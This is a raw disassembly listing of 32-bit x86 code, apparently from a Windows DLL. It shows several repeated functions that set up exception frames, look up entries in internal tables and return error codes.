10008e30:	ff 45 c8             	incl   -0x38(%ebp)
10008e33:	eb df                	jmp    0x10008e14
10008e35:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
10008e39:	74 1a                	je     0x10008e55
10008e3b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
10008e3e:	c1 e0 03             	shl    $0x3,%eax
10008e41:	8b 4f 48             	mov    0x48(%edi),%ecx
10008e44:	8b 4c 01 04          	mov    0x4(%ecx,%eax,1),%ecx
10008e48:	89 4e 14             	mov    %ecx,0x14(%esi)
10008e4b:	8b 4f 48             	mov    0x48(%edi),%ecx
10008e4e:	8b 56 10             	mov    0x10(%esi),%edx
10008e51:	89 54 01 04          	mov    %edx,0x4(%ecx,%eax,1)
10008e55:	33 c0                	xor    %eax,%eax
10008e57:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008e5b:	eb 2e                	jmp    0x10008e8b
10008e5d:	81 7d d4 e8 03 00 00 	cmpl   $0x3e8,-0x2c(%ebp)
10008e64:	77 19                	ja     0x10008e7f
10008e66:	ff 45 d4             	incl   -0x2c(%ebp)
10008e69:	8b 45 d4             	mov    -0x2c(%ebp),%eax
10008e6c:	e9 77 ff ff ff       	jmp    0x10008de8
10008e71:	6a 01                	push   $0x1
10008e73:	58                   	pop    %eax
10008e74:	c3                   	ret
10008e75:	8b 65 e8             	mov    -0x18(%ebp),%esp
10008e78:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
10008e7f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008e83:	8b 45 dc             	mov    -0x24(%ebp),%eax
10008e86:	eb 03                	jmp    0x10008e8b
10008e88:	6a 57                	push   $0x57
10008e8a:	58                   	pop    %eax
10008e8b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10008e8e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10008e95:	5f                   	pop    %edi
10008e96:	5e                   	pop    %esi
10008e97:	5b                   	pop    %ebx
10008e98:	c9                   	leave
10008e99:	c3                   	ret
10008e9a:	55                   	push   %ebp
10008e9b:	8b ec                	mov    %esp,%ebp
10008e9d:	6a ff                	push   $0xffffffff
10008e9f:	68 08 e5 00 10       	push   $0x1000e508
10008ea4:	68 00 c6 00 10       	push   $0x1000c600
10008ea9:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10008eaf:	50                   	push   %eax
10008eb0:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10008eb7:	83 ec 28             	sub    $0x28,%esp
10008eba:	53                   	push   %ebx
10008ebb:	56                   	push   %esi
10008ebc:	57                   	push   %edi
10008ebd:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008ec0:	8b 75 0c             	mov    0xc(%ebp),%esi
10008ec3:	85 f6                	test   %esi,%esi
10008ec5:	0f 84 f8 00 00 00    	je     0x10008fc3
10008ecb:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
10008ecf:	0f 85 ee 00 00 00    	jne    0x10008fc3
10008ed5:	68 20 03 01 10       	push   $0x10010320
10008eda:	ff 75 08             	push   0x8(%ebp)
10008edd:	e8 87 0c 00 00       	call   0x10009b69
10008ee2:	59                   	pop    %ecx
10008ee3:	59                   	pop    %ecx
10008ee4:	89 45 e0             	mov    %eax,-0x20(%ebp)
10008ee7:	85 c0                	test   %eax,%eax
10008ee9:	75 07                	jne    0x10008ef2
10008eeb:	6a c1                	push   $0xffffffc1
10008eed:	e9 d3 00 00 00       	jmp    0x10008fc5
10008ef2:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
10008ef9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008efd:	ff 36                	push   (%esi)
10008eff:	ff 75 08             	push   0x8(%ebp)
10008f02:	e8 a3 0a 00 00       	call   0x100099aa
10008f07:	59                   	pop    %ecx
10008f08:	59                   	pop    %ecx
10008f09:	89 45 d8             	mov    %eax,-0x28(%ebp)
10008f0c:	85 c0                	test   %eax,%eax
10008f0e:	75 05                	jne    0x10008f15
10008f10:	6a ec                	push   $0xffffffec
10008f12:	58                   	pop    %eax
10008f13:	eb 7d                	jmp    0x10008f92
10008f15:	8b b8 2c 01 00 00    	mov    0x12c(%eax),%edi
10008f1b:	89 7d d0             	mov    %edi,-0x30(%ebp)
10008f1e:	33 c0                	xor    %eax,%eax
10008f20:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10008f23:	3b 47 3c             	cmp    0x3c(%edi),%eax
10008f26:	0f 83 8e 00 00 00    	jae    0x10008fba
10008f2c:	8b 4f 58             	mov    0x58(%edi),%ecx
10008f2f:	8b 1c c1             	mov    (%ecx,%eax,8),%ebx
10008f32:	89 5d cc             	mov    %ebx,-0x34(%ebp)
10008f35:	ff 76 04             	push   0x4(%esi)
10008f38:	53                   	push   %ebx
10008f39:	ff 55 e0             	call   *-0x20(%ebp)
10008f3c:	85 c0                	test   %eax,%eax
10008f3e:	74 58                	je     0x10008f98
10008f40:	8b 46 08             	mov    0x8(%esi),%eax
10008f43:	8a 4b 01             	mov    0x1(%ebx),%cl
10008f46:	3a 48 01             	cmp    0x1(%eax),%cl
10008f49:	75 4d                	jne    0x10008f98
10008f4b:	83 65 c8 00          	andl   $0x0,-0x38(%ebp)
10008f4f:	0f b6 43 01          	movzbl 0x1(%ebx),%eax
10008f53:	39 45 c8             	cmp    %eax,-0x38(%ebp)
10008f56:	73 18                	jae    0x10008f70
10008f58:	8b 45 c8             	mov    -0x38(%ebp),%eax
10008f5b:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
10008f62:	8b 4e 08             	mov    0x8(%esi),%ecx
10008f65:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
10008f68:	89 0c 18             	mov    %ecx,(%eax,%ebx,1)
10008f6b:	ff 45 c8             	incl   -0x38(%ebp)
10008f6e:	eb df                	jmp    0x10008f4f
10008f70:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
10008f74:	74 1a                	je     0x10008f90
10008f76:	8b 45 d4             	mov    -0x2c(%ebp),%eax
10008f79:	c1 e0 03             	shl    $0x3,%eax
10008f7c:	8b 4f 58             	mov    0x58(%edi),%ecx
10008f7f:	8b 4c 01 04          	mov    0x4(%ecx,%eax,1),%ecx
10008f83:	89 4e 14             	mov    %ecx,0x14(%esi)
10008f86:	8b 4f 58             	mov    0x58(%edi),%ecx
10008f89:	8b 56 10             	mov    0x10(%esi),%edx
10008f8c:	89 54 01 04          	mov    %edx,0x4(%ecx,%eax,1)
10008f90:	33 c0                	xor    %eax,%eax
10008f92:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008f96:	eb 2e                	jmp    0x10008fc6
10008f98:	81 7d d4 e8 03 00 00 	cmpl   $0x3e8,-0x2c(%ebp)
10008f9f:	77 19                	ja     0x10008fba
10008fa1:	ff 45 d4             	incl   -0x2c(%ebp)
10008fa4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
10008fa7:	e9 77 ff ff ff       	jmp    0x10008f23
10008fac:	6a 01                	push   $0x1
10008fae:	58                   	pop    %eax
10008faf:	c3                   	ret
10008fb0:	8b 65 e8             	mov    -0x18(%ebp),%esp
10008fb3:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
10008fba:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008fbe:	8b 45 dc             	mov    -0x24(%ebp),%eax
10008fc1:	eb 03                	jmp    0x10008fc6
10008fc3:	6a 57                	push   $0x57
10008fc5:	58                   	pop    %eax
10008fc6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10008fc9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10008fd0:	5f                   	pop    %edi
10008fd1:	5e                   	pop    %esi
10008fd2:	5b                   	pop    %ebx
10008fd3:	c9                   	leave
10008fd4:	c3                   	ret
10008fd5:	55                   	push   %ebp
10008fd6:	8b ec                	mov    %esp,%ebp
10008fd8:	6a ff                	push   $0xffffffff
10008fda:	68 18 e5 00 10       	push   $0x1000e518
10008fdf:	68 00 c6 00 10       	push   $0x1000c600
10008fe4:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10008fea:	50                   	push   %eax
10008feb:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10008ff2:	83 ec 34             	sub    $0x34,%esp
10008ff5:	53                   	push   %ebx
10008ff6:	56                   	push   %esi
10008ff7:	57                   	push   %edi
10008ff8:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008ffb:	8b 75 0c             	mov    0xc(%ebp),%esi
10008ffe:	85 f6                	test   %esi,%esi
10009000:	0f 84 6d 01 00 00    	je     0x10009173
10009006:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
1000900a:	0f 85 63 01 00 00    	jne    0x10009173
10009010:	68 20 03 01 10       	push   $0x10010320
10009015:	8b 7d 08             	mov    0x8(%ebp),%edi
10009018:	57                   	push   %edi
10009019:	e8 4b 0b 00 00       	call   0x10009b69
1000901e:	59                   	pop    %ecx
1000901f:	59                   	pop    %ecx
10009020:	89 45 e0             	mov    %eax,-0x20(%ebp)
10009023:	85 c0                	test   %eax,%eax
10009025:	75 07                	jne    0x1000902e
10009027:	6a c1                	push   $0xffffffc1
10009029:	e9 47 01 00 00       	jmp    0x10009175
1000902e:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
10009035:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10009039:	ff 36                	push   (%esi)
1000903b:	57                   	push   %edi
1000903c:	e8 69 09 00 00       	call   0x100099aa
10009041:	59                   	pop    %ecx
10009042:	59                   	pop    %ecx
10009043:	89 45 d8             	mov    %eax,-0x28(%ebp)
10009046:	85 c0                	test   %eax,%eax
10009048:	75 04                	jne    0x1000904e
1000904a:	6a ec                	push   $0xffffffec
1000904c:	eb 40                	jmp    0x1000908e
1000904e:	68 f0 02 01 10       	push   $0x100102f0
10009053:	57                   	push   %edi
10009054:	e8 10 0b 00 00       	call   0x10009b69
10009059:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000905c:	68 d4 02 01 10       	push   $0x100102d4
10009061:	57                   	push   %edi
10009062:	e8 02 0b 00 00       	call   0x10009b69
10009067:	83 c4 10             	add    $0x10,%esp
1000906a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000906d:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
10009071:	0f 84 de 00 00 00    	je     0x10009155
10009077:	85 c0                	test   %eax,%eax
10009079:	0f 84 d6 00 00 00    	je     0x10009155
1000907f:	ff 75 d8             	push   -0x28(%ebp)
10009082:	ff 55 d0             	call   *-0x30(%ebp)
10009085:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009088:	85 c0                	test   %eax,%eax
1000908a:	75 0c                	jne    0x10009098
1000908c:	6a e1                	push   $0xffffffe1
1000908e:	58                   	pop    %eax
1000908f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10009093:	e9 de 00 00 00       	jmp    0x10009176
10009098:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000909f:	8b d8                	mov    %eax,%ebx
100090a1:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
100090a4:	33 c0                	xor    %eax,%eax
100090a6:	89 45 c8             	mov    %eax,-0x38(%ebp)
100090a9:	3b 43 40             	cmp    0x40(%ebx),%eax
100090ac:	0f 83 89 00 00 00    	jae    0x1000913b
100090b2:	8b 4b 5c             	mov    0x5c(%ebx),%ecx
100090b5:	8b 3c c1             	mov    (%ecx,%eax,8),%edi
100090b8:	89 7d c0             	mov    %edi,-0x40(%ebp)
100090bb:	ff 76 04             	push   0x4(%esi)
100090be:	57                   	push   %edi
100090bf:	ff 55 e0             	call   *-0x20(%ebp)
100090c2:	85 c0                	test   %eax,%eax
100090c4:	74 61                	je     0x10009127
100090c6:	8b 46 08             	mov    0x8(%esi),%eax
100090c9:	8a 4f 01             	mov    0x1(%edi),%cl
100090cc:	3a 48 01             	cmp    0x1(%eax),%cl
100090cf:	75 56                	jne    0x10009127
100090d1:	83 65 bc 00          	andl   $0x0,-0x44(%ebp)
100090d5:	0f b6 47 01          	movzbl 0x1(%edi),%eax
100090d9:	39 45 bc             	cmp    %eax,-0x44(%ebp)
100090dc:	73 18                	jae    0x100090f6
100090de:	8b 45 bc             	mov    -0x44(%ebp),%eax
100090e1:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
100090e8:	8b 4e 08             	mov    0x8(%esi),%ecx
100090eb:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
100090ee:	89 0c 38             	mov    %ecx,(%eax,%edi,1)
100090f1:	ff 45 bc             	incl   -0x44(%ebp)
100090f4:	eb df                	jmp    0x100090d5
100090f6:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
100090fa:	74 1a                	je     0x10009116
100090fc:	8b 45 c8             	mov    -0x38(%ebp),%eax
100090ff:	c1 e0 03             	shl    $0x3,%eax
10009102:	8b 4b 5c             	mov    0x5c(%ebx),%ecx
10009105:	8b 4c 01 04          	mov    0x4(%ecx,%eax,1),%ecx
10009109:	89 4e 14             	mov    %ecx,0x14(%esi)
1000910c:	8b 4b 5c             	mov    0x5c(%ebx),%ecx
1000910f:	8b 56 10             	mov    0x10(%esi),%edx
10009112:	89 54 01 04          	mov    %edx,0x4(%ecx,%eax,1)
10009116:	6a ff                	push   $0xffffffff
10009118:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000911b:	50                   	push   %eax
1000911c:	e8 b5 43 00 00       	call   0x1000d4d6
10009121:	59                   	pop    %ecx
10009122:	59                   	pop    %ecx
10009123:	33 c0                	xor    %eax,%eax
10009125:	eb 4f                	jmp    0x10009176
10009127:	81 7d c8 e8 03 00 00 	cmpl   $0x3e8,-0x38(%ebp)
1000912e:	77 0b                	ja     0x1000913b
10009130:	ff 45 c8             	incl   -0x38(%ebp)
10009133:	8b 45 c8             	mov    -0x38(%ebp),%eax
10009136:	e9 6e ff ff ff       	jmp    0x100090a9
1000913b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000913f:	e8 02 00 00 00       	call   0x10009146
10009144:	eb 24                	jmp    0x1000916a
10009146:	8b 45 d8             	mov    -0x28(%ebp),%eax
10009149:	05 c8 00 00 00       	add    $0xc8,%eax
1000914e:	50                   	push   %eax
1000914f:	ff 55 d4             	call   *-0x2c(%ebp)
10009152:	c3                   	ret
10009153:	eb 15                	jmp    0x1000916a
10009155:	6a e0                	push   $0xffffffe0
10009157:	e9 32 ff ff ff       	jmp    0x1000908e
1000915c:	6a 01                	push   $0x1
1000915e:	58                   	pop    %eax
1000915f:	c3                   	ret
10009160:	8b 65 e8             	mov    -0x18(%ebp),%esp
10009163:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
1000916a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000916e:	8b 45 dc             	mov    -0x24(%ebp),%eax
10009171:	eb 03                	jmp    0x10009176
10009173:	6a 57                	push   $0x57
10009175:	58                   	pop    %eax
10009176:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10009179:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10009180:	5f                   	pop    %edi
10009181:	5e                   	pop    %esi
10009182:	5b                   	pop    %ebx
10009183:	c9                   	leave
10009184:	c3                   	ret
10009185:	55                   	push   %ebp
10009186:	8b ec                	mov    %esp,%ebp
10009188:	6a ff                	push   $0xffffffff
1000918a:	68 30 e5 00 10       	push   $0x1000e530
1000918f:	68 00 c6 00 10       	push   $0x1000c600
10009194:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000919a:	50                   	push   %eax
1000919b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100091a2:	83 ec 34             	sub    $0x34,%esp
100091a5:	53                   	push   %ebx
100091a6:	56                   	push   %esi
100091a7:	57                   	push   %edi
100091a8:	89 65 e8             	mov    %esp,-0x18(%ebp)
100091ab:	8b 75 0c             	mov    0xc(%ebp),%esi
100091ae:	85 f6                	test   %esi,%esi
100091b0:	0f 84 6d 01 00 00    	je     0x10009323
100091b6:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
100091ba:	0f 85 63 01 00 00    	jne    0x10009323
100091c0:	68 20 03 01 10       	push   $0x10010320
100091c5:	8b 7d 08             	mov    0x8(%ebp),%edi
100091c8:	57                   	push   %edi
100091c9:	e8 9b 09 00 00       	call   0x10009b69
100091ce:	59                   	pop    %ecx
100091cf:	59                   	pop    %ecx
100091d0:	89 45 e0             	mov    %eax,-0x20(%ebp)
100091d3:	85 c0                	test   %eax,%eax
100091d5:	75 07                	jne    0x100091de
100091d7:	6a c1                	push   $0xffffffc1
100091d9:	e9 47 01 00 00       	jmp    0x10009325
100091de:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
100091e5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100091e9:	ff 36                	push   (%esi)
100091eb:	57                   	push   %edi
100091ec:	e8 b9 07 00 00       	call   0x100099aa
100091f1:	59                   	pop    %ecx
100091f2:	59                   	pop    %ecx
100091f3:	89 45 d8             	mov    %eax,-0x28(%ebp)
100091f6:	85 c0                	test   %eax,%eax
100091f8:	75 04                	jne    0x100091fe
100091fa:	6a ec                	push   $0xffffffec
100091fc:	eb 40                	jmp    0x1000923e
100091fe:	68 f0 02 01 10       	push   $0x100102f0
10009203:	57                   	push   %edi
10009204:	e8 60 09 00 00       	call   0x10009b69
10009209:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000920c:	68 d4 02 01 10       	push   $0x100102d4
10009211:	57                   	push   %edi
10009212:	e8 52 09 00 00       	call   0x10009b69
10009217:	83 c4 10             	add    $0x10,%esp
1000921a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000921d:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
10009221:	0f 84 de 00 00 00    	je     0x10009305
10009227:	85 c0                	test   %eax,%eax
10009229:	0f 84 d6 00 00 00    	je     0x10009305
1000922f:	ff 75 d8             	push   -0x28(%ebp)
10009232:	ff 55 d0             	call   *-0x30(%ebp)
10009235:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009238:	85 c0                	test   %eax,%eax
1000923a:	75 0c                	jne    0x10009248
1000923c:	6a e1                	push   $0xffffffe1
1000923e:	58                   	pop    %eax
1000923f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10009243:	e9 de 00 00 00       	jmp    0x10009326
10009248:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000924f:	8b d8                	mov    %eax,%ebx
10009251:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
10009254:	33 c0                	xor    %eax,%eax
10009256:	89 45 c8             	mov    %eax,-0x38(%ebp)
10009259:	3b 43 4c             	cmp    0x4c(%ebx),%eax
1000925c:	0f 83 89 00 00 00    	jae    0x100092eb
10009262:	8b 4b 68             	mov    0x68(%ebx),%ecx
10009265:	8b 3c c1             	mov    (%ecx,%eax,8),%edi
10009268:	89 7d c0             	mov    %edi,-0x40(%ebp)
1000926b:	ff 76 04             	push   0x4(%esi)
1000926e:	57                   	push   %edi
1000926f:	ff 55 e0             	call   *-0x20(%ebp)
10009272:	85 c0                	test   %eax,%eax
10009274:	74 61                	je     0x100092d7
10009276:	8b 46 08             	mov    0x8(%esi),%eax
10009279:	8a 4f 01             	mov    0x1(%edi),%cl
1000927c:	3a 48 01             	cmp    0x1(%eax),%cl
1000927f:	75 56                	jne    0x100092d7
10009281:	83 65 bc 00          	andl   $0x0,-0x44(%ebp)
10009285:	0f b6 47 01          	movzbl 0x1(%edi),%eax
10009289:	39 45 bc             	cmp    %eax,-0x44(%ebp)
1000928c:	73 18                	jae    0x100092a6
1000928e:	8b 45 bc             	mov    -0x44(%ebp),%eax
10009291:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
10009298:	8b 4e 08             	mov    0x8(%esi),%ecx
1000929b:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
1000929e:	89 0c 38             	mov    %ecx,(%eax,%edi,1)
100092a1:	ff 45 bc             	incl   -0x44(%ebp)
100092a4:	eb df                	jmp    0x10009285
100092a6:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
100092aa:	74 1a                	je     0x100092c6
100092ac:	8b 45 c8             	mov    -0x38(%ebp),%eax
100092af:	c1 e0 03             	shl    $0x3,%eax
100092b2:	8b 4b 68             	mov    0x68(%ebx),%ecx
100092b5:	8b 4c 01 04          	mov    0x4(%ecx,%eax,1),%ecx
100092b9:	89 4e 14             	mov    %ecx,0x14(%esi)
100092bc:	8b 4b 68             	mov    0x68(%ebx),%ecx
100092bf:	8b 56 10             	mov    0x10(%esi),%edx
100092c2:	89 54 01 04          	mov    %edx,0x4(%ecx,%eax,1)
100092c6:	6a ff                	push   $0xffffffff
100092c8:	8d 45 f0             	lea    -0x10(%ebp),%eax
100092cb:	50                   	push   %eax
100092cc:	e8 05 42 00 00       	call   0x1000d4d6
100092d1:	59                   	pop    %ecx
100092d2:	59                   	pop    %ecx
100092d3:	33 c0                	xor    %eax,%eax
100092d5:	eb 4f                	jmp    0x10009326
100092d7:	81 7d c8 e8 03 00 00 	cmpl   $0x3e8,-0x38(%ebp)
100092de:	77 0b                	ja     0x100092eb
100092e0:	ff 45 c8             	incl   -0x38(%ebp)
100092e3:	8b 45 c8             	mov    -0x38(%ebp),%eax
100092e6:	e9 6e ff ff ff       	jmp    0x10009259
100092eb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100092ef:	e8 02 00 00 00       	call   0x100092f6
100092f4:	eb 24                	jmp    0x1000931a
100092f6:	8b 45 d8             	mov    -0x28(%ebp),%eax
100092f9:	05 c8 00 00 00       	add    $0xc8,%eax
100092fe:	50                   	push   %eax
100092ff:	ff 55 d4             	call   *-0x2c(%ebp)
10009302:	c3                   	ret
10009303:	eb 15                	jmp    0x1000931a
10009305:	6a e0                	push   $0xffffffe0
10009307:	e9 32 ff ff ff       	jmp    0x1000923e
1000930c:	6a 01                	push   $0x1
1000930e:	58                   	pop    %eax
1000930f:	c3                   	ret
10009310:	8b 65 e8             	mov    -0x18(%ebp),%esp
10009313:	c7 45 dc e4 ff ff ff 	movl   $0xffffffe4,-0x24(%ebp)
1000931a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000931e:	8b 45 dc             	mov    -0x24(%ebp),%eax
10009321:	eb 03                	jmp    0x10009326
10009323:	6a 57                	push   $0x57
10009325:	58                   	pop    %eax
10009326:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10009329:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10009330:	5f                   	pop    %edi
10009331:	5e                   	pop    %esi
10009332:	5b                   	pop    %ebx
10009333:	c9                   	leave
10009334:	c3                   	ret
10009335:	55                   	push   %ebp
10009336:	8b ec                	mov    %esp,%ebp
10009338:	6a ff                	push   $0xffffffff
1000933a:	68 48 e5 00 10       	push   $0x1000e548
1000933f:	68 00 c6 00 10       	push   $0x1000c600
10009344:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000934a:	50                   	push   %eax
1000934b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10009352:	83 ec 34             	sub    $0x34,%esp
10009355:	53                   	push   %ebx
10009356:	56                   	push   %esi
10009357:	57                   	push   %edi
10009358:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000935b:	8b 75 0c             	mov    0xc(%ebp),%esi
1000935e:	85 f6                	test   %esi,%esi
10009360:	0f 84 6d 01 00 00    	je     0x100094d3
10009366:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
1000936a:	0f 85 63 01 00 00    	jne    0x100094d3
10009370:	68 20 03 01 10       	push   $0x10010320
10009375:	8b 7d 08             	mov    0x8(%ebp),%edi
10009378:	57                   	push   %edi
10009379:	e8 eb 07 00 00       	call   0x10009b69
1000937e:	59                   	pop    %ecx
1000937f:	59                   	pop    %ecx
10009380:	89 45 e0             	mov    %eax,-0x20(%ebp)
10009383:	85 c0                	test   %eax,%eax
10009385:	75 07                	jne    0x1000938e
10009387:	6a c1                	push   $0xffffffc1
10009389:	e9 47 01 00 00       	jmp    0x100094d5
1000938e:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
10009395:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10009399:	ff 36                	push   (%esi)
1000939b:	57                   	push   %edi
1000939c:	e8 09 06 00 00       	call   0x100099aa
100093a1:	59                   	pop    %ecx
100093a2:	59                   	pop    %ecx
100093a3:	89 45 d8             	mov    %eax,-0x28(%ebp)
100093a6:	85 c0                	test   %eax,%eax
100093a8:	75 04                	jne    0x100093ae
100093aa:	6a ec                	push   $0xffffffec
100093ac:	eb 40                	jmp    0x100093ee
100093ae:	68 f0 02 01 10       	push   $0x100102f0
100093b3:	57                   	push   %edi
100093b4:	e8 b0 07 00 00       	call   0x10009b69
100093b9:	89 45 d0             	mov    %eax,-0x30(%ebp)
100093bc:	68 d4 02 01 10       	push   $0x100102d4
100093c1:	57                   	push   %edi
100093c2:	e8 a2 07 00 00       	call   0x10009b69
100093c7:	83 c4 10             	add    $0x10,%esp
100093ca:	89 45 d4             	mov    %eax,-0x2c(%ebp)
100093cd:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
100093d1:	0f 84 de 00 00 00    	je     0x100094b5
100093d7:	85 c0                	test   %eax,%eax
100093d9:	0f 84 d6 00 00 00    	je     0x100094b5
100093df:	ff 75 d8             	push   -0x28(%ebp)
100093e2:	ff 55 d0             	call   *-0x30(%ebp)
100093e5:	89 45 cc             	mov    %eax,-0x34(%ebp)
100093e8:	85 c0                	test   %eax,%eax
100093ea:	75 0c                	jne    0x100093f8
100093ec:	6a e1                	push   $0xffffffe1
100093ee:	58                   	pop    %eax
100093ef:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100093f3:	e9 de 00 00 00       	jmp    0x100094d6
100093f8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
100093ff:	8b d8                	mov    %eax,%ebx
10009401:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
10009404:	33 c0                	xor    %eax,%eax
10009406:	89 45 c8             	mov    %eax,-0x38(%ebp)
10009409:	3b 43 4c             	cmp    0x4c(%ebx),%eax
1000940c:	0f 83 89 00 00 00    	jae    0x1000949b
10009412:	8b 4b 68             	mov    0x68(%ebx),%ecx
10009415:	8b 3c c1             	mov    (%ecx,%eax,8),%edi
10009418:	89 7d c0             	mov    %edi,-0x40(%ebp)
1000941b:	ff 76 04             	push   0x4(%esi)
1000941e:	57                   	push   %edi
1000941f:	ff 55 e0             	call   *-0x20(%ebp)
10009422:	85 c0                	test   %eax,%eax
10009424:	74 61                	je     0x10009487
10009426:	8b 46 08             	mov    0x8(%esi),%eax
10009429:	8a 4f 01             	mov    0x1(%edi),%cl
1000942c:	3a 48 01             	cmp    0x1(%eax),%cl
1000942f:	75 56                	jne    0x10009487
10009431:	83 65 bc 00          	andl   $0x0,-0x44(%ebp)
10009435:	0f b6 47 01          	movzbl 0x1(%edi),%eax
10009439:	39 45 bc             	cmp    %eax,-0x44(%ebp)
1000943c:	73 18                	jae    0x10009456
1000943e:	8b 45 bc             	mov    -0x44(%ebp),%eax
10009441:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
10009448:	8b 4e 08             	mov    0x8(%esi),%ecx
1000944b:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
1000944e:	89 0c 38             	mov    %ecx,(%eax,%edi,1)
10009451:	ff 45 bc             	incl   -0x44(%ebp)
10009454:	eb df                	jmp    0x10009435
10009456:	80 7e 0c 00          	cmpb   $0x0,0xc(%esi)
1000945a:	74 1a                	je     0x10009476
1000945c:	8b 45 c8             	mov    -0x38(%ebp),%eax
1000945f:	c1 e0 03             	shl    $0x3,%eax
10009462:	8b 4b 68             	mov    0x68(%ebx),%ecx
10009465:	8b 4c 01 04          	mov    0x4(%ecx,%eax,1),%ecx
10009469:	89 4e 14             	mov    %ecx,0x14(%esi)
1000946c:	8b 4b 68             	mov    0x68(%ebx),%ecx
1000946f:	8b 56 10             	mov    0x10(%esi),%edx
10009472:	89 54 01 04          	mov    %edx,0x4(%ecx,%eax,1)
10009476:	6a ff                	push   $0xffffffff
10009478:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000947b:	50                   	push   %eax
1000947c:	e8 55 40 00 00       	call   0x1000d4d6
10009481:	59                   	pop    %ecx
10009482:	59                   	pop    %ecx
10009483:	33 c0                	xor    %eax,%eax
10009485:	eb 4f                	jmp    0x100094d6
10009487:	81 7d c8 e8 03 00 00 	cmpl   $0x3e8,-0x38(%ebp)
1000948e:	77 0b                	ja     0x1000949b
10009490:	ff 45 c8             	incl   -0x38(%ebp)
10009493:	8b 45 c8             	mov    -0x38(%ebp),%eax
10009496:	e9 6e ff ff ff       	jmp    0x10009409
1000949b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000949f:	e8 02 00 00 00       	call   0x100094a6
100094a4:	eb 24                	jmp    0x100094ca
100094a6:	8b 45 d8             	mov    -0x28(%ebp),%eax
100094a9:	05 d8 00 00 00       	add    $0xd8,%eax
100094ae:	50                   	push   %eax
100094af:	ff 55 d4             	call   *-0x2c(%ebp)
100094b2:	c3                   	ret
100094b3:	eb 15                	jmp    0x100094ca
100094b5:	6a e0                	push   $0xffffffe0
100094b7:	e9 32 ff ff ff       	jmp    0x100093ee
100094bc:	6a 01                	push   $0x1
100094be:	58                   	pop    %eax
100094bf:	c3                   	ret
